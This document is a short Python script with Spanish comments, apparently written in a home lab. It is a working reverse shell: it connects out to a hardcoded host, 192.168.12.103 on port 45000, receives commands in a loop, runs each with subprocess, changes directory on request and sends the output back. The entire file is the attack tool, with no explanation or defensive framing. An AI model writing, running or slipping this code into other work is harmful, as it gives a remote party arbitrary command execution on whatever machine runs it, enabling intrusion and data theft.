import socket
import subprocess
import os

ip = '192.168.12.103'
port = 45000
buffer_size = 2048

s = socket.socket()
s.connect((ip, port))

print(s.recv(buffer_size).decode())

while True:
    command = s.recv(buffer_size).decode()

    if command == 'exit':
        break

    if command.startswith('cd'):
        try:
            directory = command.split(' ')[1].strip()  # Eliminar caracteres de nueva línea y espacios en blanco
            os.chdir(directory)  # Cambiar el directorio de trabajo
            s.send(f'Directorio cambiado a {os.getcwd()}\n'.encode())
        except Exception as e:
            s.send(f'Error al cambiar de directorio: {str(e)}\n'.encode())
    else:
        try:
            output = subprocess.getoutput(command)
            s.send(output.encode())
        except Exception as e:
            s.send(f'Error al ejecutar el comando: {str(e)}\n'.encode())

s.close()
